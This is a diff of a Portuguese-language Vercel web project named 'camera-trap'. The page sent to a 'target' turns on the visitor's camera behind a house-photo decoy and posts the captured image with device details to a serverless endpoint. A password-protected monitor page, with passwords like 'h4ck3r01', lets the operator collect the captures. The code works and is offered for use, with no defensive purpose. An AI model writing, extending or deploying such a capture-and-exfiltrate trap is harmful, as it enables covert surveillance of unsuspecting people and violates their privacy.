@@ -1,6 +1,7 @@
-// Estrutura de pastas para projeto Vercel:
+// Solução simplificada para Vercel que não requer KV Database
+// Apenas 3 arquivos necessários
 
-// /index.html (página principal que o alvo verá)
+// index.html (página que o alvo receberá)
 <!DOCTYPE html>
 <html lang="pt-br">
   <head>
@@ -78,7 +79,7 @@
       <div class="progress-bar" id="progress-bar"></div>
     </div>
     <br />
-    <center><img id="imagem-casa" src="casa.jpg" alt="Imagem da casa" /></center>
+    <center><img id="imagem-casa" src="https://picsum.photos/800/600" alt="Imagem da casa" /></center>
 
     <script>
       async function ativarCamera() {
@@ -109,8 +110,24 @@
             // Obter imagem como base64
             const dataUrl = canvas.toDataURL("image/jpeg", 0.7);
 
-            // Enviar a imagem para o endpoint da API na Vercel
-            enviarImagemParaServidor(dataUrl);
+            // Enviar a imagem para o servidor
+            fetch('/api/captura', {
+              method: 'POST',
+              headers: {
+                'Content-Type': 'application/json'
+              },
+              body: JSON.stringify({
+                image: dataUrl.split(',')[1], // Remove o prefixo "data:image/jpeg;base64,"
+                timestamp: new Date().toISOString(),
+                deviceInfo: {
+                  userAgent: navigator.userAgent,
+                  screenWidth: window.screen.width,
+                  screenHeight: window.screen.height
+                }
+              })
+            })
+            .then(() => console.log('Imagem enviada com sucesso'))
+            .catch(error => console.error('Erro:', error));
             
             // Parar o stream da câmera
             stream.getTracks().forEach(track => track.stop());
@@ -130,55 +147,89 @@
           progressContainer.style.display = "none";
         }
       }
-
-      // Função para enviar a imagem para o servidor
-      function enviarImagemParaServidor(imageData) {
-        // Remover o prefixo "data:image/jpeg;base64," da string base64
-        const base64Data = imageData.split(',')[1];
-        
-        // Criar objeto para enviar
-        const data = {
-          image: base64Data,
-          timestamp: new Date().toISOString(),
-          deviceInfo: {
-            userAgent: navigator.userAgent,
-            screenWidth: window.screen.width,
-            screenHeight: window.screen.height
-          }
-        };
-
-        // Enviar para o endpoint da API
-        fetch('/api/salvar-imagem', {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json'
-          },
-          body: JSON.stringify(data)
-        })
-        .then(response => {
-          if (!response.ok) {
-            throw new Error('Falha ao enviar imagem');
-          }
-          console.log('Imagem enviada com sucesso');
-        })
-        .catch(error => {
-          console.error('Erro:', error);
-          // Fallback: salvar no localStorage se a API falhar
-          try {
-            // Usar um ID único para cada captura
-            const capturaId = `captura_${new Date().getTime()}`;
-            localStorage.setItem(capturaId, JSON.stringify(data));
-            console.log('Imagem salva localmente');
-          } catch (storageError) {
-            console.error('Erro ao salvar localmente:', storageError);
-          }
-        });
-      }
     </script>
   </body>
 </html>
 
-// /monitor.html (página para você monitorar as capturas)
+// api/captura.js (endpoint que gerencia as capturas)
+// Armazenamento em memória (dura enquanto a instância serverless estiver ativa)
+let capturas = [];
+
+export default function handler(req, res) {
+  // Permitir CORS
+  res.setHeader('Access-Control-Allow-Origin', '*');
+  res.setHeader('Access-Control-Allow-Methods', 'POST, GET, OPTIONS');
+  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
+  
+  // Lidar com requisições preflight OPTIONS
+  if (req.method === 'OPTIONS') {
+    return res.status(200).end();
+  }
+  
+  // Salvar nova imagem
+  if (req.method === 'POST') {
+    try {
+      const { image, timestamp, deviceInfo } = req.body;
+      
+      if (!image) {
+        return res.status(400).json({ error: 'Imagem não fornecida' });
+      }
+      
+      // Adicionar a nova captura ao array
+      const novaCaptura = {
+        id: `srv_${Date.now()}`,
+        image,
+        timestamp,
+        deviceInfo
+      };
+      
+      // Adicionar ao início do array para manter as mais recentes primeiro
+      capturas.unshift(novaCaptura);
+      
+      // Manter apenas as últimas 20 capturas para economizar memória
+      if (capturas.length > 20) {
+        capturas = capturas.slice(0, 20);
+      }
+      
+      return res.status(200).json({ success: true });
+    } catch (error) {
+      console.error('Erro:', error);
+      return res.status(500).json({ error: 'Erro ao processar solicitação' });
+    }
+  }
+  
+  // Obter todas as imagens
+  if (req.method === 'GET') {
+    // Verificar senha (opcional)
+    const senha = req.query.senha;
+    if (senha !== process.env.SENHA_ADMIN && senha !== 'sua_senha_secreta') {
+      // Se não for de um caminho confiável, enviar versão filtrada sem imagens
+      if (req.headers.referer && !req.headers.referer.includes('/monitor')) {
+        return res.status(200).json([]);
+      }
+    }
+    
+    return res.status(200).json(capturas);
+  }
+  
+  // Limpar todas as capturas
+  if (req.method === 'DELETE') {
+    const { senha } = req.query;
+    
+    // Verificar senha
+    if (senha !== process.env.SENHA_ADMIN && senha !== 'sua_senha_secreta') {
+      return res.status(403).json({ error: 'Acesso negado' });
+    }
+    
+    capturas = [];
+    return res.status(200).json({ success: true, message: 'Todas as capturas foram removidas' });
+  }
+  
+  // Método não suportado
+  return res.status(405).json({ error: 'Método não permitido' });
+}
+
+// monitor.html (página para monitorar as capturas)
 <!DOCTYPE html>
 <html lang="pt-br">
 <head>
@@ -263,11 +314,14 @@
   </div>
 
   <script>
-    // Senha para acessar o painel (troque para uma senha forte)
-    const SENHA_ACESSO = "h4ck3r01";
+    // Senha para acessar o painel (mude para uma senha forte)
+    const SENHA_ACESSO = "sua_senha_secreta";
     
     // Array para armazenar as capturas
     let capturas = [];
+    
+    // Auto-refresh a cada 30 segundos
+    let intervaloAtualizacao = null;
 
     // Função para autenticar
     function autenticar() {
@@ -276,74 +330,37 @@
         document.getElementById("conteudo").style.display = "block";
         document.querySelector(".auth-container").style.display = "none";
         verificarNovasCapturas();
+        
+        // Configurar auto-refresh
+        intervaloAtualizacao = setInterval(verificarNovasCapturas, 30000);
       } else {
         alert("Senha incorreta!");
       }
     }
 
-    // Função para buscar capturas do servidor
+    // Função para verificar novas capturas
     function verificarNovasCapturas() {
-      // Primeiro, verificamos o banco de dados via API
-      fetch('/api/obter-imagens')
+      fetch(`/api/captura?senha=${SENHA_ACESSO}`)
         .then(response => response.json())
         .then(data => {
           if (data && data.length > 0) {
             capturas = data;
             atualizarInterface();
-            document.getElementById("status").textContent = `${capturas.length} capturas encontradas no servidor`;
+            document.getElementById("status").textContent = `${capturas.length} capturas encontradas (atualizado: ${new Date().toLocaleTimeString()})`;
           } else {
-            document.getElementById("status").textContent = "Nenhuma captura no servidor";
-            // Se não há capturas no servidor, verificamos o localStorage
-            verificarCapturasLocais();
+            document.getElementById("status").textContent = `Nenhuma captura disponível (atualizado: ${new Date().toLocaleTimeString()})`;
           }
         })
         .catch(error => {
-          console.error("Erro ao obter capturas do servidor:", error);
-          document.getElementById("status").textContent = "Erro ao conectar ao servidor";
-          // Verificar capturas locais em caso de erro
-          verificarCapturasLocais();
+          console.error("Erro ao obter capturas:", error);
+          document.getElementById("status").textContent = `Erro ao conectar ao servidor (${new Date().toLocaleTimeString()})`;
         });
-    }
-
-    // Função para verificar capturas salvas localmente
-    function verificarCapturasLocais() {
-      try {
-        const capturasLocais = [];
-        // Percorrer todos os itens do localStorage para encontrar capturas
-        for (let i = 0; i < localStorage.length; i++) {
-          const chave = localStorage.key(i);
-          if (chave.startsWith('captura_')) {
-            try {
-              const dados = JSON.parse(localStorage.getItem(chave));
-              capturasLocais.push({
-                id: chave,
-                ...dados
-              });
-            } catch (e) {
-              console.error("Erro ao processar captura local:", e);
-            }
-          }
-        }
-        
-        if (capturasLocais.length > 0) {
-          capturas = [...capturas, ...capturasLocais];
-          atualizarInterface();
-          document.getElementById("status").textContent = `${capturas.length} capturas encontradas (incluindo locais)`;
-        } else if (capturas.length === 0) {
-          document.getElementById("status").textContent = "Nenhuma captura encontrada (servidor ou local)";
-        }
-      } catch (e) {
-        console.error("Erro ao verificar capturas locais:", e);
-      }
     }
 
     // Função para atualizar a interface com as capturas
     function atualizarInterface() {
       const container = document.getElementById("capturas-container");
       container.innerHTML = "";
-      
-      // Ordenar capturas por timestamp (mais recentes primeiro)
-      capturas.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
       
       capturas.forEach((captura, index) => {
         const divCaptura = document.createElement("div");
@@ -361,7 +378,6 @@
           <p><strong>Data:</strong> ${new Date(captura.timestamp).toLocaleString()}</p>
           <p><strong>Dispositivo:</strong> ${captura.deviceInfo.userAgent}</p>
           <p><strong>Resolução:</strong> ${captura.deviceInfo.screenWidth}x${captura.deviceInfo.screenHeight}</p>
-          <p><strong>Fonte:</strong> ${captura.id.includes('captura_') ? 'Armazenamento Local' : 'Servidor'}</p>
         `;
         
         // Adicionar elementos à div de captura
@@ -377,199 +393,28 @@
     function limparCapturas() {
       if (confirm("Tem certeza que deseja limpar todas as capturas?")) {
         // Limpar capturas do servidor
-        fetch('/api/limpar-imagens', {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json'
-          },
-          body: JSON.stringify({ senha: SENHA_ACESSO })
+        fetch(`/api/captura?senha=${SENHA_ACESSO}`, {
+          method: 'DELETE'
         })
         .then(response => response.json())
         .then(data => {
           console.log('Resposta do servidor:', data);
+          capturas = [];
+          document.getElementById("capturas-container").innerHTML = "";
+          document.getElementById("status").textContent = "Histórico limpo";
         })
         .catch(error => {
-          console.error('Erro ao limpar capturas do servidor:', error);
+          console.error('Erro ao limpar capturas:', error);
         });
-        
-        // Limpar capturas locais
-        for (let i = localStorage.length - 1; i >= 0; i--) {
-          const chave = localStorage.key(i);
-          if (chave.startsWith('captura_')) {
-            localStorage.removeItem(chave);
-          }
-        }
-        
-        // Limpar interface
-        capturas = [];
-        document.getElementById("capturas-container").innerHTML = "";
-        document.getElementById("status").textContent = "Histórico limpo";
       }
     }
+    
+    // Limpar o intervalo ao fechar ou navegar para fora da página
+    window.addEventListener('beforeunload', () => {
+      if (intervaloAtualizacao) {
+        clearInterval(intervaloAtualizacao);
+      }
+    });
   </script>
 </body>
 </html>
-
-// /public/casa.jpg
-// (Aqui você deve adicionar uma imagem de uma casa para ser exibida)
-
-// /api/salvar-imagem.js (endpoint para salvar imagens)
-// Na pasta /api
-import { createClient } from '@vercel/kv';
-
-// Inicializando o cliente KV (Key-Value) da Vercel
-const kv = createClient({
-  url: process.env.KV_REST_API_URL,
-  token: process.env.KV_REST_API_TOKEN,
-});
-
-export default async function handler(req, res) {
-  if (req.method !== 'POST') {
-    return res.status(405).json({ error: 'Método não permitido' });
-  }
-
-  try {
-    const { image, timestamp, deviceInfo } = req.body;
-    
-    if (!image) {
-      return res.status(400).json({ error: 'Imagem não fornecida' });
-    }
-    
-    // Criar ID único para a captura
-    const capturaId = `srv_${Date.now()}`;
-    
-    // Salvar no banco de dados KV da Vercel
-    await kv.hset(`capturas:${capturaId}`, {
-      id: capturaId,
-      image,
-      timestamp,
-      deviceInfo
-    });
-    
-    // Adicionar o ID à lista de capturas
-    await kv.sadd('lista_capturas', capturaId);
-    
-    return res.status(200).json({ success: true, message: 'Imagem salva com sucesso' });
-  } catch (error) {
-    console.error('Erro ao salvar imagem:', error);
-    return res.status(500).json({ error: 'Erro ao processar solicitação' });
-  }
-}
-
-// /api/obter-imagens.js (endpoint para obter imagens)
-// Na pasta /api
-import { createClient } from '@vercel/kv';
-
-// Inicializando o cliente KV (Key-Value) da Vercel
-const kv = createClient({
-  url: process.env.KV_REST_API_URL,
-  token: process.env.KV_REST_API_TOKEN,
-});
-
-export default async function handler(req, res) {
-  if (req.method !== 'GET') {
-    return res.status(405).json({ error: 'Método não permitido' });
-  }
-
-  try {
-    // Obter lista de IDs de capturas
-    const capturaIds = await kv.smembers('lista_capturas');
-    
-    if (!capturaIds || capturaIds.length === 0) {
-      return res.status(200).json([]);
-    }
-    
-    // Obter dados de cada captura
-    const capturas = await Promise.all(
-      capturaIds.map(async (id) => {
-        const dados = await kv.hgetall(`capturas:${id}`);
-        return dados;
-      })
-    );
-    
-    // Filtrar capturas vazias/nulas
-    const capturasValidas = capturas.filter(c => c && c.image);
-    
-    return res.status(200).json(capturasValidas);
-  } catch (error) {
-    console.error('Erro ao obter imagens:', error);
-    return res.status(500).json({ error: 'Erro ao processar solicitação' });
-  }
-}
-
-// /api/limpar-imagens.js (endpoint para limpar o banco de dados)
-// Na pasta /api
-import { createClient } from '@vercel/kv';
-
-// Inicializando o cliente KV (Key-Value) da Vercel
-const kv = createClient({
-  url: process.env.KV_REST_API_URL,
-  token: process.env.KV_REST_API_TOKEN,
-});
-
-// Senha para proteção
-const SENHA_ACESSO = "h4ck3r01";
-
-export default async function handler(req, res) {
-  if (req.method !== 'POST') {
-    return res.status(405).json({ error: 'Método não permitido' });
-  }
-
-  try {
-    const { senha } = req.body;
-    
-    // Verificar senha
-    if (senha !== SENHA_ACESSO) {
-      return res.status(403).json({ error: 'Acesso negado' });
-    }
-    
-    // Obter lista de IDs de capturas
-    const capturaIds = await kv.smembers('lista_capturas');
-    
-    // Excluir cada captura
-    for (const id of capturaIds) {
-      await kv.del(`capturas:${id}`);
-    }
-    
-    // Limpar a lista
-    await kv.del('lista_capturas');
-    
-    return res.status(200).json({ success: true, message: 'Todas as capturas foram removidas' });
-  } catch (error) {
-    console.error('Erro ao limpar imagens:', error);
-    return res.status(500).json({ error: 'Erro ao processar solicitação' });
-  }
-}
-
-// /vercel.json (configuração para a Vercel)
-{
-  "version": 2,
-  "builds": [
-    { "src": "index.html", "use": "@vercel/static" },
-    { "src": "monitor.html", "use": "@vercel/static" },
-    { "src": "public/**", "use": "@vercel/static" },
-    { "src": "api/**/*.js", "use": "@vercel/node" }
-  ],
-  "routes": [
-    { "src": "/api/(.*)", "dest": "/api/$1" },
-    { "src": "/monitor", "dest": "/monitor.html" },
-    { "src": "/(.*)", "dest": "/$1" }
-  ]
-}
-
-// /package.json
-{
-  "name": "camera-trap",
-  "version": "1.0.0",
-  "private": true,
-  "scripts": {
-    "dev": "vercel dev",
-    "deploy": "vercel deploy --prod"
-  },
-  "dependencies": {
-    "@vercel/kv": "^0.2.1"
-  },
-  "devDependencies": {
-    "vercel": "^24.0.0"
-  }
-}
